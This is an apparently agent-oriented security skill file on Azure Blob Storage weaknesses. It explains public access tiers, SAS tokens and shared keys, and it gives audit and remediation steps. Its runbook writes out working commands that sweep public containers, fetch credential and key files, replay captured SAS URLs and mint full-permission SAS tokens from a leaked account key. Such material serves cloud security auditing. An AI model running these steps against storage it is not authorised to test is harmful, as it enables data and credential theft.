---
name: azure-blob-attack-surface
description: Azure Storage Blob — public containers, anonymous access, SAS-token abuse, shared keys, soft-delete bypass
triggers: [azure storage, blob storage, container, sas token, shared access signature, anonymous blob, public access, storage key]
---

# Azure Storage Blob Attack Surface

Azure Blob Storage mirrors S3's failure modes with Azure-specific terminology. Three big bug classes: **public anonymous access** (container-level or account-level), **over-shared SAS tokens** (URL-signed access with too-long TTL or too-wide permissions), and **shared-key leakage** (the account-level master keys that bypass all RBAC).

Strix's `cloud_attack_paths/patterns.py` includes `_pattern_azure_storage_public_blob`. Companion to `cspm/prowler.py` for the broader Storage Account audit.

## Attack Surface

### Anonymous access tiers
| Tier | What's readable anonymously |
|---|---|
| `Disabled` | Nothing |
| `Blob` (container) | Individual blobs by URL (but no LIST) |
| `Container` | LIST + individual blob reads |

Account-level setting `allowBlobPublicAccess: false` overrides per-container — but legacy accounts often have it `true`.

### SAS tokens
- **User Delegation SAS**: signed by Azure AD identity; revokable via key rotation
- **Service SAS**: signed by the shared key (the worst)
- **Account SAS**: signed by the shared key; wide scope
- TTL: up to one year by default (configurable max)
- Permissions: `r` (read), `w` (write), `d` (delete), `l` (list), `c` (create), `i` (immutable)

### Shared keys (Account Keys)
- Two keys per account (`key1`, `key2`) for rotation
- `Microsoft.Storage/storageAccounts/listKeys/action` permission = read both keys
- Once leaked, attacker has FULL access until both rotated
- Conditional Access doesn't apply; Shared Key bypasses RBAC

### CORS misconfig
- Storage account CORS rules apply to the data plane
- `AllowedOrigins: ["*"]` + `AllowedHeaders: ["*"]` + `MaxAgeInSeconds` high → cross-origin abuse from any web origin

### Soft-delete + retention
- `DeleteRetentionPolicy.enabled: true` keeps deleted blobs for the retention period
- Bug: attacker deletes evidence; rotation policy makes it look gone; soft-delete preserves it for ops recovery
- Also: legacy data not subject to current rotation policy stays accessible

## Detection Channels

### Storage account inventory

```bash
# All storage accounts the principal can list
az storage account list --query '[].{name:name, rg:resourceGroup, allowPublic:allowBlobPublicAccess, sharedKey:allowSharedKeyAccess}'

# Account-level "allow public access" setting (critical)
az storage account show --name <ACCT> --query 'allowBlobPublicAccess'
```

### Container-level public access

```bash
# Each container's public-access tier
az storage container list --account-name <ACCT> --query '[].{name:name, public:properties.publicAccess}'
```

`Container` = LIST + read; `Blob` = read-only-by-URL; `None` = private.

### SAS-token enumeration (when present in code / config)

```bash
# Search for SAS URLs in the codebase
grep -rE 'https://[^/]+\.blob\.core\.windows\.net/.*?[?]sv=' ./

# Decode the SAS components
# ?sv=<version>&ss=<services>&srt=<resource>&sp=<perms>&se=<expiry>&...

python3 <<EOF
from urllib.parse import urlparse, parse_qs
url = '<SAS_URL>'
qs = parse_qs(urlparse(url).query)
print(f"Expiry: {qs.get('se', ['?'])[0]}")
print(f"Permissions: {qs.get('sp', ['?'])[0]}")
print(f"Resource scope: {qs.get('srt', ['?'])[0]}")
EOF
```

### Anonymous reachability

```bash
# Container LIST (if public)
curl -s "https://<ACCT>.blob.core.windows.net/<CONTAINER>?restype=container&comp=list"

# Individual blob (no LIST)
curl -s "https://<ACCT>.blob.core.windows.net/<CONTAINER>/<BLOB_PATH>"
```

## Operational Runbook

### Step 1 — full storage inventory

```bash
SUBS=$(az account list --query '[].id' --output tsv)
for sub in $SUBS; do
  az account set --subscription "$sub"
  echo "=== SUB $sub ==="
  az storage account list --output table
done
```

### Step 2 — flag public accounts + containers

```bash
# Account-level
az storage account list --query '[?allowBlobPublicAccess==`true`].{name:name, rg:resourceGroup}'

# Container-level (within each public-allowed account)
for acct in $(az storage account list --query '[?allowBlobPublicAccess==`true`].name' --output tsv); do
  echo "=== $acct ==="
  az storage container list --account-name "$acct" \
    --query '[?properties.publicAccess!=`null`].{name:name, access:properties.publicAccess}'
done
```

### Step 3 — anonymous data sweep

```bash
# For each public container, attempt LIST
for container in <list of public containers>; do
  URL="https://<ACCT>.blob.core.windows.net/${container}?restype=container&comp=list"
  curl -s "$URL" > /tmp/blob_list.xml
  if grep -q '<Name>' /tmp/blob_list.xml; then
    echo "PUBLIC-LIST: ${container}"
    xmllint --xpath '//*[local-name()="Name"]/text()' /tmp/blob_list.xml | head
  fi
done
```

### Step 4 — sensitive-data filename heuristics

```bash
# Within accessible containers, look for high-value files
for blob in $(xmllint --xpath '//*[local-name()="Name"]/text()' /tmp/blob_list.xml); do
  case "$blob" in
    *.env*|*credentials*|*backup*|*.sql|*.bak|*.dump|*.pfx|*.pem|*.key)
      echo "HIGH-VALUE: ${blob}"
      curl -s "https://<ACCT>.blob.core.windows.net/${container}/${blob}" | head
      ;;
  esac
done
```

### Step 5 — SAS-token validity check

```bash
# Test whether captured SAS URLs are still valid
SAS_URL='https://acct.blob.core.windows.net/container/file?sv=...&sig=...'
STATUS=$(curl -s -o /dev/null -w '%{http_code}' "$SAS_URL")
echo "$STATUS"

# 200 = valid; 403 = expired / revoked; 404 = bad path
```

### Step 6 — Shared-key compromise impact

```bash
# When you have either Account Key:
KEY='...'
ACCT='target_account'

# Direct access to ANY container (bypasses RBAC, bypasses CORS)
az storage blob list --account-name "$ACCT" --account-key "$KEY" --container-name <CONTAINER>

# Or via SAS generation (impersonate)
az storage account generate-sas --account-name "$ACCT" --account-key "$KEY" \
  --permissions racwdl --resource-types sco --services bfqt \
  --expiry $(date -u -d '1 hour' '+%Y-%m-%dT%H:%MZ')
```

## Specific Vulnerability Classes

### `allowSharedKeyAccess: true` + RBAC theatre
- Tenant sets up RBAC for granular access
- But `allowSharedKeyAccess: true` means anyone with the account key bypasses RBAC entirely
- Bug: a script using shared-key in CI; the key leaked to logs / git → game over

### SAS without IP restriction
- SAS issued without `signedIp` field → globally usable
- Combine with no time-bound → effectively a permanent leak

### Static-website hosting
- `$web` container serves as a static site
- Often left public; sometimes the site origin moves but the container's content stays accessible at the blob URL

### Soft-delete masking
- Attacker deletes evidence; account has soft-delete enabled
- Attacker's deletion isn't visible in the LIST (containers/blobs marked deleted); but they're still in storage
- The blue team's recovery point includes attacker's evidence

### Cross-region replication leaks
- Account replicates to another region for DR
- Replica region has *its own* access settings → drift; primary tight, replica loose

## Validation

1. Anonymous LIST returns blob names + sizes.
2. Anonymous GET returns the blob content.
3. SAS replay: captured SAS URL serves content with no auth.
4. Shared-key compromise: connect via `--account-key` + dump containers the RBAC-scoped principal wouldn't have reached.
5. Document: storage account, region, public-access tier, key-access flag, sensitive file(s) leaked.

## False Positives

- Storage account intentionally serving public static content (logos, marketing assets). Verify with operator.
- Soft-delete preserving recently-deleted user data — not strictly leak unless principal has overly-broad recovery permissions.
- SAS URLs in code that are legitimately shared with end-users (e.g., download links from a customer portal) — context-dependent.

## Impact

- Mass data exfil of customer files / backups / logs.
- Persistent compromise via Shared Key leak (rotation required to revoke).
- Supply-chain abuse via `$web` container poisoning.
- Service-tier escalation via misconfigured Service SAS.

## Remediation

1. **`allowBlobPublicAccess: false`** at the account level. Block via Azure Policy.
2. **`allowSharedKeyAccess: false`** — force RBAC + AAD-authenticated access only.
3. **Rotate account keys quarterly**: break old SAS tokens that haven't been re-issued.
4. **SAS with `signedIp` + short TTL + `User Delegation` mode**: AAD-signed, revocable.
5. **CORS allow-list with explicit origins** — no `*`.
6. **Azure Policy**: `Storage accounts should restrict network access` + `Storage accounts should disable public network access`.
7. **Defender for Storage**: alerts on anomalous access patterns + malware uploads.

## Pro Tips

1. The most-leaked file in Azure Blob: `*.env`. Same as S3.
2. `$web` containers serving static sites bypass many "is this public" tools — they're public by design.
3. Storage account names are GLOBALLY UNIQUE; if you can guess one, you can probe. Try org-name + region-suffix patterns.
4. The `azcopy` tool is faster than `az storage blob` for bulk operations once you have a key/SAS.
5. Microsoft's `Storage Explorer` desktop app reveals soft-deleted blobs UI-side — useful for investigations.

## Summary

Azure Blob's failure modes parallel S3's: anonymous access tiers, oversharing via SAS, master-key compromise. Audit `allowBlobPublicAccess` + `allowSharedKeyAccess` first; sweep public containers anonymously; verify SAS-token TTLs.
